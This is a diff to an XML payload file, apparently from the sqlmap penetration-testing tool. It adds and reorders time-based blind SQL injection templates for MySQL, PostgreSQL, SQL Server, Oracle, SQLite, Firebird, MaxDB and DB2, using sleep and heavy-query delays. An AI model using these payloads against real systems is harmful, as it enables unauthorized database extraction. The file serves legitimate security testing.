@@ -2838,63 +2838,6 @@ Formats:
 
     <!-- Time-based blind tests - Parameter replace -->
     <test>
-        <title>MySQL time-based blind - Parameter replace (MAKE_SET)</title>
-        <stype>5</stype>
-        <level>3</level>
-        <risk>1</risk>
-        <clause>1,2,3</clause>
-        <where>3</where>
-        <vector>MAKE_SET([INFERENCE],SLEEP([SLEEPTIME]))</vector>
-        <request>
-            <payload>MAKE_SET([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))</payload>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-        </details>
-    </test>
-
-    <test>
-        <title>MySQL time-based blind - Parameter replace (ELT)</title>
-        <stype>5</stype>
-        <level>4</level>
-        <risk>1</risk>
-        <clause>1,2,3</clause>
-        <where>3</where>
-        <vector>ELT([INFERENCE],SLEEP([SLEEPTIME]))</vector>
-        <request>
-            <payload>ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))</payload>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-        </details>
-    </test>
-
-    <test>
-        <title>MySQL time-based blind - Parameter replace (bool*int)</title>
-        <stype>5</stype>
-        <level>4</level>
-        <risk>1</risk>
-        <clause>1,2,3</clause>
-        <where>3</where>
-        <vector>([INFERENCE])*SLEEP([SLEEPTIME])</vector>
-        <request>
-            <payload>([RANDNUM]=[RANDNUM])*SLEEP([SLEEPTIME])</payload>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-        </details>
-    </test>
-
-    <test>
         <title>MySQL &gt;= 5.0 time-based blind - Parameter replace</title>
         <stype>5</stype>
         <level>3</level>
@@ -2933,20 +2876,96 @@ Formats:
         </details>
     </test>
 
-    <!-- TODO: carry on editing these payloads -->
     <test>
-        <title>PostgreSQL time-based blind - Parameter replace (GENERATE_SERIES)</title>
+        <title>MySQL time-based blind - Parameter replace (bool*int)</title>
         <stype>5</stype>
-        <level>3</level>
-        <risk>2</risk>
+        <level>4</level>
+        <risk>1</risk>
         <clause>1,2,3</clause>
         <where>3</where>
-        <vector>(SELECT GENERATE_SERIES([ORIGVALUE],[ORIGVALUE],CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END) LIMIT 1)</vector>
+        <vector>([INFERENCE])*SLEEP([SLEEPTIME])</vector>
         <request>
-            <payload>(SELECT GENERATE_SERIES([ORIGVALUE],[ORIGVALUE],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)</payload>
+            <payload>([RANDNUM]=[RANDNUM])*SLEEP([SLEEPTIME])</payload>
         </request>
         <response>
             <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL time-based blind - Parameter replace (MAKE_SET)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>MAKE_SET([INFERENCE],SLEEP([SLEEPTIME]))</vector>
+        <request>
+            <payload>MAKE_SET([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL time-based blind - Parameter replace (ELT)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>ELT([INFERENCE],SLEEP([SLEEPTIME]))</vector>
+        <request>
+            <payload>ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL &gt; 8.1 time-based blind - Parameter replace</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+            <dbms_version>&gt; 8.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL time-based blind - Parameter replace (heavy query)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
         </response>
         <details>
             <dbms>PostgreSQL</dbms>
@@ -2960,12 +2979,33 @@ Formats:
         <risk>1</risk>
         <clause>1,3</clause>
         <where>3</where>
-        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</vector>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN WAITFOR DELAY '0:0:[SLEEPTIME]' ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</vector>
         <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</payload>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN WAITFOR DELAY '0:0:[SLEEPTIME]' ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</payload>
         </request>
         <response>
             <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+            <os>Windows</os>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase time-based blind - Parameter replace (heavy queries)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END))</vector>
+        <request>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
         </response>
         <details>
             <dbms>Microsoft SQL Server</dbms>
@@ -2981,9 +3021,9 @@ Formats:
         <risk>1</risk>
         <clause>1,3</clause>
         <where>3</where>
-        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)</vector>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END) FROM DUAL)</vector>
         <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)</payload>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END) FROM DUAL)</payload>
         </request>
         <response>
             <time>[SLEEPTIME]</time>
@@ -2994,40 +3034,99 @@ Formats:
     </test>
 
     <test>
-        <title>Microsoft Access time-based blind - Parameter replace</title>
+        <title>Oracle time-based blind - Parameter replace (heavy queries)</title>
         <stype>5</stype>
-        <level>3</level>
-        <risk>1</risk>
+        <level>4</level>
+        <risk>2</risk>
         <clause>1,3</clause>
         <where>3</where>
-        <vector>IIF([INFERENCE],[ORIGVALUE],1/0)</vector>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END) FROM DUAL)</vector>
         <request>
-            <payload>IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0)</payload>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END) FROM DUAL)</payload>
         </request>
         <response>
-            <time>[SLEEPTIME]</time>
+            <time>[DELAYED]</time>
         </response>
         <details>
-            <dbms>Microsoft Access</dbms>
+            <dbms>Oracle</dbms>
         </details>
     </test>
 
     <test>
-        <title>SAP MaxDB time-based blind - Parameter replace</title>
+        <title>SQLite &gt; 2.0 time-based blind - Parameter replace (heavy query)</title>
         <stype>5</stype>
-        <level>3</level>
-        <risk>1</risk>
-        <clause>1,3</clause>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>1,2,3</clause>
         <where>3</where>
-        <vector>(CASE WHEN [INFERENCE] THEN [ORIGVALUE] ELSE NULL END)</vector>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]0000000))))) ELSE [RANDNUM] END))</vector>
         <request>
-            <payload>(CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE NULL END)</payload>
+            <payload>(SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]0000000)))))</payload>
         </request>
         <response>
-            <time>[SLEEPTIME]</time>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>SQLite</dbms>
+            <dbms_version>&gt; 2.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>Firebird time-based blind - Parameter replace (heavy query)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3),[RANDNUM])</vector>
+        <request>
+            <payload>(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Firebird</dbms>
+            <dbms_version>&gt;= 2.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>SAP MaxDB time-based blind - Parameter replace (heavy query)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1, (SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2, (SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3)</vector>
+        <request>
+            <payload>(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1, DOMAIN.COLUMNS AS T2, DOMAIN.TABLES AS T3)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
         </response>
         <details>
             <dbms>SAP MaxDB</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>IBM DB2 AND time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))</vector>
+        <request>
+            <payload>(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>IBM DB2</dbms>
         </details>
     </test>
     <!-- End of time-based blind tests - Parameter replace -->
